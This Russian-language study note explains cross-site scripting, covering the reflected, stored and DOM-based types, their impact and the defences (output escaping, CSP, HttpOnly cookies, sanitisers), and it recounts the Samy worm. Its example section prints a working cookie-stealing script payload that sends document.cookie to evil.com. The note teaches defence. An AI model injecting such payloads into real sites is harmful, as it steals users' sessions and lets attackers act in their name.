---
title: XSS — межсайтовый скриптинг
aliases: ["XSS", "Cross-Site Scripting"]
type: concept
layer: security
chapter: 8
difficulty: basic
prerequisites: ["[[Web — архитектура]]", "[[Cookies и web tracking]]"]
related: ["[[CSRF]]", "[[SQL-инъекция]]", "[[Sandboxing — выполнение недоверенного кода]]"]
tags: [networking, ch08]
---
# XSS — Cross-Site Scripting

## TL;DR
Класс web-атак: **внедрение JavaScript** атакующего в страницу легитимного сайта. Жертва открывает страницу → JS атакующего выполняется в **контексте** этого сайта → может украсть cookies, перенаправить, действовать от имени пользователя. **3 типа: Reflected, Stored, DOM**. Защита: **escaping output**, **CSP** (Content Security Policy), `HttpOnly` cookies, **template engines с auto-escape**.

## Какую проблему решает
Web-страницы — динамический HTML. Если сервер вставляет **untrusted user input** в HTML без escape'а → атакующий может включить `<script>...</script>`. Защита от этого — фундаментальная задача всей web-разработки.

## Как работает

### Reflected XSS
- Атакующий шлёт жертве URL: `https://site.com/search?q=<script>...</script>`
- Сервер вставляет q в результат: `Вы искали: <script>...</script>`
- Жертва открывает → JS выполняется.
- Stолько **«одноразовая»**: ссылка, которой нужно делиться.

### Stored XSS
- Атакующий пишет comment с `<script>...</script>` на форум.
- Сервер сохраняет, отдаёт всем посетителям.
- **Каждый**, кто открыл comment, заражается.

### DOM-based XSS
- JS на странице сам читает URL/innerHTML и вставляет в DOM без escape.
- Сервер не виноват — bug в client-side JS.

### Что атакующий может
- **Steal cookies** (если не HttpOnly): `document.cookie` → POST на attacker.com.
- **Phishing** — изменить страницу, показать фальшивую login-форму.
- **Defacement** — переписать содержимое.
- **Client-side keylogging.**

## Защита

**1. Output encoding (escape):**
- Перед вставкой в HTML — заменить `<`, `>`, `&`, `"`, `'` на entities.
- В JavaScript-context — другой escaping.
- В URL-context — третий.
- **Template engines** (Jinja, ERB, React JSX) делают auto-escape.

**2. CSP (Content Security Policy):**
HTTP-header `Content-Security-Policy: script-src 'self'` → браузер не выполнит inline-`<script>` или скрипты с других доменов.

**3. HttpOnly cookies:**
Cookie с флагом `HttpOnly` не доступна из `document.cookie` → даже при XSS не украсть.

**4. Sanitization libraries** — DOMPurify для cleaning HTML.

## Пример
**Stored XSS на форуме (типичный):**
- Атакующий: `<script>fetch('https://evil.com/?c='+document.cookie)</script>`.
- Форум сохранил как комментарий.
- Каждый user, открывший тред, → cookie уходит на evil.com.
- evil.com → авторизация в форуме как этот user.

**Реальный кейс — MySpace Worm Samy (2005):**
- Stored XSS в profile-странице.
- При просмотре заражённого profile → код добавлял Samy в friends + копировал на свой profile.
- За 20 часов — миллион заражений.

## Связи
- **Базируется на:** [[Web — архитектура]] (где живут страницы), [[Cookies и web tracking]] (что крадут).
- **Используется в:** контекст для CSP-настроек, **Same-Origin Policy** (соседняя web-security концепция).
- **Соседи по уровню:** [[CSRF]], [[SQL-инъекция]] — другие web-атаки; [[Sandboxing — выполнение недоверенного кода]] — общий принцип изоляции.
- **Противопоставляется:** server-side атаки (SQLi, RCE) — нацелены на сервер; XSS — на клиента.

## Подводные камни
- **Mock защиты** часто фейл: **regex-based escape** легко обходится экзотическими payload'ами.
- **DOM XSS** не ловится server-side WAF — нужно review JS-code.
- **CSP** мощная, но complex настройка; ошибка → ломает легитимный JS.
- В **современных frameworks (React/Vue)** auto-escape по умолчанию, XSS реже — но `dangerouslySetInnerHTML` возвращает риск.

## Дальше читать
- [[CSRF]], [[SQL-инъекция]] — соседние атаки.
- [[Sandboxing — выполнение недоверенного кода]] — родственная тема.
- Tanenbaum, гл. 8, §8.12.1 (стр. PDF 927–928).
